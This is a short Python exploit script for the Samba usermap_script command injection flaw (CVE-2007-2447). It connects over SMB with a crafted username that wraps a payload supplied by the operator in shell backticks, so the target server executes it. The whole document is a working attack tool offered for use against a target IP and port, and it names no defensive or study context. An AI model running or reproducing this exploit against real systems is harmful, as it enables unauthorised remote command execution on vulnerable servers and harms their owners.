#!/usr/bin/python3
import sys, argparse
from smb.SMBConnection import SMBConnection

def main():
    if args.ip and args.port and args.payload:
        user = '`/nohup ' + payload + '`'
        conn = SMBConnection(user, 'na', 'na', 'na', use_ntlm_v2=False)
    
        try:
            print(f'[*] Sending the {payload}')
            conn.connect(ip, int(port))
            print(f'Connecting to {ip}, {port}!')
            print(f'[*] Payload: {payload} was sent successfully!')
        except Exception as e:
            print(f'[*] Error: {e}')
    else:
        print('Invalid Arguments Supplied!')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
                    prog = 'Samba Usermap Exploit',
                    description = 'Exploits the CVE-2007-2447 vulnerability',
                    epilog = '')
    parser.add_argument('-i', '--ip', type=str, help='Target IP Address', required=True)
    parser.add_argument('-p', '--port', type=int, help='Target Port (Common port: 139)', required=True)
    parser.add_argument('-pl', '--payload', type=str, help='Payload to be executed on target machine', required=True)
    args = parser.parse_args()
    ip = args.ip
    port = args.port
    payload = args.payload
    main()
    
